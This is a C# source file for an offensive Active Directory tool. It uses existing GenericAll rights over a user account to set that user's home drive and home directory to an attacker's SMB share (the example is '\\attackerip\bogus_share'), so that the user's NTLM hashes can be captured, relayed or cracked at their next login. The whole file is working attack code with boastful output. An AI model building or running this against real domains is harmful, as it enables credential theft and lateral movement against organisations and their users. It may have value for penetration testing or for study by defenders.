using System;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.DirectoryServices.AccountManagement;

namespace HomeDirectory
{
    class Program
    {               
        static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Description: leverage existing 'GenericAll' AD rights over an object ie: user\n" +
                    "               to set their profile to an attacker smb server ie: ntlmrelayx to dump hashes, \n" + 
                    "               relay, crack.\n\n" +
                    "Usage: HomeDirectory.exe <username> <drive letter> <attacker share>\n\n" +
                    "Example: HomeDirectory.exe jblogg N " + @"\\attackerip\bogus_share");
                return;
            }

            else
            {
                string username = args[0]; 
                string driveLetter = args[1] + ":";
                string homeDir = args[2];
                
                try
                {
                    // Make connection to AD as the user in which this thread is running
                    PrincipalContext connect = new PrincipalContext(ContextType.Domain);

                    // Find user 1st argument
                    UserPrincipal u = new UserPrincipal(connect);
                    u.SamAccountName = username;

                    // Search for user current home directory settings
                    PrincipalSearcher search = new PrincipalSearcher(u);
                    UserPrincipal result = (UserPrincipal)search.FindOne();
                    search.Dispose();

                    // current settings
                    if ((result.HomeDrive != null) && (result.HomeDirectory != null))
                    {
                        Console.WriteLine("Current drive Letter - " + result.HomeDrive);
                        Console.WriteLine("Current home directory - " + result.HomeDirectory);
                        Console.WriteLine("     \n[*] Make note of current settings to reset when done :)\n\n");
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Cyan;
                        Console.WriteLine("Current drive letter and home directory setting is empty\n\n");
                    }

                    Console.ResetColor();

                    result.HomeDrive = driveLetter;
                    result.HomeDirectory = homeDir;
                    result.Save();

                    Console.ForegroundColor = ConsoleColor.Magenta;

                    // confirm saved setting - - -> Save() is void -- better way of doing it but for now this will do
                    Console.WriteLine("[+} updated drive letter to - - - - > " + result.HomeDrive);
                    Console.WriteLine("\n\n[+] updated home directory to - - - -  > " + result.HomeDirectory);
                    Console.WriteLine("\n\n[*] pwnage will occur the next time they login.");

                    Console.ResetColor();
                }

                catch (Exception e)
                {
                    Console.WriteLine("Problem: " + e.Message);
                }

                /**
                 //another option to bind to domain without specifying the entry point of AD 
            
                DirectoryEntry rootDSE = new DirectoryEntry("LDAP://RootDSE");
                var defaultNamingContext = rootDSE.Properties["defaultNamingContext"].Value;
                rootDSE.Properties["homedirectory"].Add(homeDir);
                rootDSE.CommitChanges();
                **/
            }
        }
    }
}
